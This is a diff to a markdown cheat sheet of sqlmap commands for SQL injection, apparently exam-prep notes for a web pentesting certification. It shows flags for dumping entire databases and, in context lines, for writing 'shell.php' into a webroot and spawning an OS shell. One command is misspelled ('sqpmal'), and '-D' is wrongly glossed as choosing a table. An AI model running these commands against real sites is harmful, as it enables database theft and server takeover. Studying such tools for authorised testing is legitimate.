@@ -36,7 +36,47 @@
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |
 
-## SQLMap Payloads in order to use on a real scenario
+### Usefull Commands for eWPTX!
+```bash
+#Seleccionar un target
+sqlmap -u "http://www.target.com/path/file.htm?variable=1"
+
+#Cargar una petición desde un archivo
+sqlmap -r request
+
+#Utilizar User-Agent random
+sqlmap -u "http://www.target.com/path/file.htm?variable=1" --random-agent
+
+#Establecer el nivel de riesgo
+sqlmap -u "http://www.target.com/path/file.htm?variable=1" --risk [0-3]
+
+#Establecer el nivel de intensidad del ataque
+sqlmap -u "http://www.target.com/path/file.htm?variable=1" --level [0-5]
+
+#Controlar la petición con un proxy por ej BurpSuite
+sqlmap --proxy "http://127.0.0.1:8080"
+
+#Establecer una cookie
+sqlmap --cookie "example=COOKIE"
+
+#Atacar un parametro especifico
+sqlmap -p "parametro" 
+
+#Establecer un token CSRF
+sqlmap --csrf-token "token"
+sqlmap --csrf-url "url"
+
+#Especificar el gestor de base de datos
+sqlmap --dbms=gestor
+
+#Especificar una tabla 
+sqpmal -D "table"
+
+#Dumpear toda la DB
+sqlmap --dump
+```
+
+### SQLMap Payloads in order to use on a real scenario
 
 1. Basic Enumeration
 ```bash
